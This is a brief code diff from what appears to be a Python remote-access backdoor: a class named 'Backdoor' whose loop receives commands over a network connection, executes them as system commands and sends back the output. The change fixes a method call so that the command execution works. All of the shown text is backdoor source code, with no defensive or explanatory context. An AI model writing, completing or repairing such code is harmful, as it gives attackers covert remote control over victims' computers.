@@ -15,7 +15,7 @@ class Backdoor:
 
             command = connection.recv(1024)
 
-            command_result = execute_system_command(command)
+            command_result = self.execute_system_command(command)
 
             connection.send(command_result)
 
